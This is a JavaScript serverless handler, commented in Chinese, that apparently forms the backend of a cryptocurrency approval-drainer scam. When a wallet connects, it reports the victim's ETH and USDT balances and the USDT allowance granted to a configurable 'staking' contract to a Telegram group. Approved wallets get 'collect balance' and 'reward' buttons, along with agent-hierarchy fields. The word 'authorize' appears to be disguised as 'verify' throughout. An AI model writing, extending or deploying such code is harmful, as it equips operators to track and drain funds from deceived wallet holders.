// Vercel API - 处理用户连接事件
const { ethers } = require('ethers');
const TelegramBot = require('node-telegram-bot-api');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { address, action = 'connect' } = req.body;

    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ error: '无效的钱包地址' });
    }

    // 获取区块链信息
    const userInfo = await getUserBlockchainInfo(address);
    
    // 发送到Telegram
    await sendUserInfoToTelegram(userInfo, action);

    res.json({ 
      success: true, 
      message: '用户信息已发送到Telegram群组',
      userInfo: userInfo
    });

  } catch (error) {
    console.error('处理用户连接事件失败:', error);
    res.status(500).json({ error: error.message });
  }
}

async function getUserBlockchainInfo(address) {
  const ETH_RPC_URL = process.env.ETH_RPC_URL || 'https://ethereum.publicnode.com';
  const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  const STAKING_CONTRACT = process.env.STAKING_CONTRACT_ADDRESS;

  const provider = new ethers.JsonRpcProvider(ETH_RPC_URL);

  // ETH余额
  const ethBalance = await provider.getBalance(address);
  const ethBalanceFormatted = ethers.formatEther(ethBalance);

  // USDT余额
  const usdtContract = new ethers.Contract(
    USDT_CONTRACT,
    ['function balanceOf(address) view returns (uint256)'],
    provider
  );
  const usdtBalance = await usdtContract.balanceOf(address);
  const usdtBalanceFormatted = ethers.formatUnits(usdtBalance, 6);

  // verify额度
  let allowance = '0';
  if (STAKING_CONTRACT) {
    const allowanceRaw = await usdtContract.allowance(address, STAKING_CONTRACT);
    allowance = ethers.formatUnits(allowanceRaw, 6);
  }

  return {
    address: address,
    ethBalance: parseFloat(ethBalanceFormatted).toFixed(6),
    usdtBalance: parseFloat(usdtBalanceFormatted).toFixed(6),
    allowance: parseFloat(allowance).toFixed(4),
    isAuthorized: parseFloat(allowance) > 0 ? '是' : '否',
    lastUpdated: new Date().toISOString(),
    userNumber: Math.floor(Math.random() * 9999) + 1000, // 简化的用户编号
    superiorAgent: 'N/A',
    agentNickname: 'N/A',
    userRemark: 'Vercel用户',
    authorizedContract: STAKING_CONTRACT
  };
}

async function sendUserInfoToTelegram(userInfo, action) {
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  
  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error('Telegram配置缺失');
  }

  const bot = new TelegramBot(BOT_TOKEN);
  
  const operationType = action === 'connect' ? '客户连接钱包' : 
                       action === 'authorize' ? '客户新增其他verify' : '客户操作';

  const message = `
**钱包余额**: ${userInfo.usdtBalance}
**顶层代理**: ${userInfo.superiorAgent}
**代理昵称**: ${userInfo.agentNickname}
**用户编号**: ${userInfo.userNumber}
**用户备注**: ${userInfo.userRemark}
**是否活动**: ${userInfo.isAuthorized}
**用户钱包**: 
${userInfo.address}
**verify金额**: ${userInfo.allowance} USDT
**客户地址**: 
${userInfo.address.toLowerCase()}
**verify对象**: 
${userInfo.authorizedContract || 'N/A'}
**执行操作**: ${operationType}
  `.trim();

  // 为verify用户添加键盘按钮
  let options = { parse_mode: 'Markdown' };
  
  if (userInfo.isAuthorized === '是') {
    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: '💰 归集余额', callback_data: `collect_${userInfo.address}_${userInfo.userNumber}` },
          { text: '🎁 发放奖励', callback_data: `reward_${userInfo.address}_${userInfo.userNumber}` }
        ],
        [
          { text: '👥 所属代理', callback_data: `agent_${userInfo.address}_${userInfo.userNumber}` },
          { text: '📝 用户备注', callback_data: `note_${userInfo.address}_${userInfo.userNumber}` }
        ]
      ]
    };
    options.reply_markup = inlineKeyboard;
  }

  await bot.sendMessage(CHAT_ID, message, options);
}

